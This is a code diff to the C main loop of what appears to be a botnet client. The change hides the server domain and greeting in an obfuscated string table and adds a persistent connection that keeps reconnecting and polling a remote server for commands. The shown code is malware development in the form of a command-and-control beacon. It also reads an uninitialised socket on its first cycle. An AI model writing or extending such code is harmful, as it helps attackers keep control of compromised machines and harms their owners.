@@ -16,6 +16,29 @@
 
 #define RESPONSE_SIZE 4096
 
+uint8_t is_connected(int socket_fd)
+{
+    fd_set read_fds;
+    struct timeval timeout = {0, 0};
+
+    FD_ZERO(&read_fds);
+    FD_SET(socket_fd, &read_fds);
+
+    int status = select(socket_fd + 1, &read_fds, NULL, NULL, &timeout);
+    if (status == 0)
+    {
+        return 1;
+    }
+    else if (status > 0)
+    {
+        if (FD_ISSET(socket_fd, &read_fds))
+        {
+            return 1;
+        }
+    }
+    return 0;
+}
+
 int main(void)
 {
     dict_init();
@@ -23,30 +46,44 @@ int main(void)
     int client_fd;
     struct sockaddr_in server_address;
     char buffer[RESPONSE_SIZE];
-    const char *message = "Hello from bot";
+    const char *message = dict_get(DICT_SERVER_HELLO);
+    
+    u_int8_t is_first_cycle = 1;
 
     while (1)
     {
-        if (receiver_init(&client_fd, &server_address, dict_get(DICT_DOMAIN_NAME)) != 0)
+        if (is_connected(client_fd) == 0 || is_first_cycle == 1)
         {
+            if (receiver_init(&client_fd, &server_address, dict_get(DICT_DOMAIN_NAME)) != 0)
+            {
 #ifdef DEBUG
-            printf("[main] Connection failed, retrying in 2 seconds...\n");
+                printf("[main] Connection failed, retrying in 2 seconds...\n");
 #endif
-            sleep(2);
-            continue;
-        }
+                sleep(2);
+                continue;
+            }
 
-        if (send(client_fd, message, strlen(message), 0) < 0)
-        {
 #ifdef DEBUG
-            perror("[main] Error: Sending data");
+            printf("[main] Initialized socket\n");
 #endif
-            close(client_fd);
-            sleep(2);
-            continue;
+
+            if (send(client_fd, message, strlen(message), 0) < 0)
+            {
+#ifdef DEBUG
+                perror("[main] Error: Sending data");
+#endif
+                close(client_fd);
+                sleep(2);
+                continue;
+            }
+
+#ifdef DEBUG
+            printf("[main] Sent message to server\n");
+#endif
         }
 
         ssize_t received = recv_server_command(client_fd, buffer, sizeof(buffer));
+
         if (received < 0)
         {
 #ifdef DEBUG
@@ -54,17 +91,27 @@ int main(void)
 #endif
             close(client_fd);
             sleep(2);
-            continue; 
+            continue;
         }
 
 #ifdef DEBUG
-        printf("[main] Received from server: %s\n", buffer);
+        if (received > 0)
+        {
+            printf("[main] Received from server: %s\n", buffer);
+        }
+        else
+        {
+            printf("[main] No data received\n");
+        }
 #endif
 
-        close(client_fd);
-        sleep(2); 
+        memset(buffer, 0, sizeof(buffer));
+        is_first_cycle = 0;
+
+        sleep(2);
     }
 
+    close(client_fd);
     dict_free();
     return 0;
 }
